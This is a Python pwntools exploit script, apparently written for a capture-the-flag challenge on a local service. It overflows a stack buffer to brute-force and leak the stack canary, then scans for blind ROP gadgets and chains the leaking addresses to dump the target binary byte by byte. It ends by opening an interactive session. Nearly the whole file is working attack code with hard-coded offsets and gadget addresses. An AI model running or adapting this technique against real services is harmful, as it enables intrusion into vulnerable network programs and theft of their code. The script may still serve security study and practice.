from pwn import *
import fuckpy3, binascii, time

p = remote("localhost", 31338)

def bruteforceCanary():
    # just to show that it works
    canary = ""
    for k in range(8):
        for i in range(0,255):
            payload = ('a'*104 + canary + chr(i)).bytes()
            print(binascii.hexlify(payload.bytes()))
        
            p.send(payload)
            time.sleep(0.5)
            resp  = p.read()
            print("pl: {}, resp: {}".format(len(payload), len(resp)))
            print("response: {}".format(resp))

            if b"internet" not in resp:
                print("byte found: {}".format(hex(i)))
                canary += chr(i)
                break

    print("final canary: {}".format( binascii.hexlify(canary.bytes()) ))


def leakCanary():

    payload = 'a'*105
    p.send(payload.bytes())
    time.sleep(0.5)

    resp = p.read()
    canary = resp[105:112] # 7 bytes
    # no strip, because address can contain 'a'
    
    return int(binascii.hexlify((b'\x00'+canary)[::-1]),16)


def leakStack(payload):
    p.send(payload.bytes())
    time.sleep(0.5)
    resp = p.read()
    leak = resp[len(payload):].strip(b"You broke the internet!\n")
    if len(leak) == 0:
        return 0
    return int(binascii.hexlify(leak[::-1]),16)


CRASH_MSG = b"You broke the internet!\n"


canary = leakCanary()
print("Canary: {}".format(hex(canary)))

#for i in range(1,10):
#    leak = leakStack("a"*104 + "a"*(8*i))
#    print("Leak: {} - {}".format(i*8, hex(leak)))


# looking for brop gadgets
start_addr = 0x400000 # since it is not PIE, we have a fixed address


# setting canary and rbp
payload = b"a"*104 + p64(canary) + p64(0)
print(payload)

print("\nstart exhaustive search...\n")
offset = 0x1050

crashes = []
while False:
    
    rip = p64(start_addr + offset)    
    pl = payload + rip + b"A"*64

    p.send(pl)
    time.sleep(0.7)
    
    resp = p.read()

    if resp == b"a"*104:
        print("Safe Exit at {}".format(hex(start_addr + offset)))
    elif resp == b"a"*104 + CRASH_MSG:
        print("Crash: {}".format(hex(start_addr + offset)))
        crashes.append(start_addr + offset)
    else:
        print("Possible leak: {} \n{}".format(hex(start_addr+offset), resp))

    if (offset % 0x10) == 0:
        print("offset: {}".format(hex(start_addr + offset)))

    offset += 1

# found leaks
leaks = [0x4011b5, 0x4011b6, 0x4011b7, 0x4011b8, 0x4011ba, 0x4011bb]
crashes = [0x4012ca, 0x4012cb, 0x4012cc, 0x4012cd, 0x4012ce, 0x4012cf, 0x4012d0, 0x4012d1, 0x4012d2, 0x4012d3, 0x4012d4]


print("chain crashes with leaks...")
print("and hope for more leaks :)")

'''
for la in leaks:
    for ca in crashes:

        pl = payload + p64(ca) + p64(start_addr)*2 + p64(la)
        p.send(pl)
        time.sleep(0.7)

        resp = p.read()[104:]
        print("{} - {}".format(hex(ca), hex(la) + " | " + str(resp) ))
'''

# arbitrary leaking offsets
ca = 0x4012d1
la = 0x4011ba

print("start leaking the binary")


offset = 0
binary_bytes = []
while True:
    
    pl = payload + p64(ca) + p64(start_addr + offset)*2 + p64(la)
    p.send(pl)
    time.sleep(0.7)

    # leak byte by byte
    resp = p.read()[104:].strip(CRASH_MSG)
    if len(resp) == 0:
        resp = 0
    else:
        resp = resp[0]

    print("{}: {}".format(hex(start_addr + offset), hex(resp)))
    binary_bytes.append(resp)
    offset += 1


p.interactive()

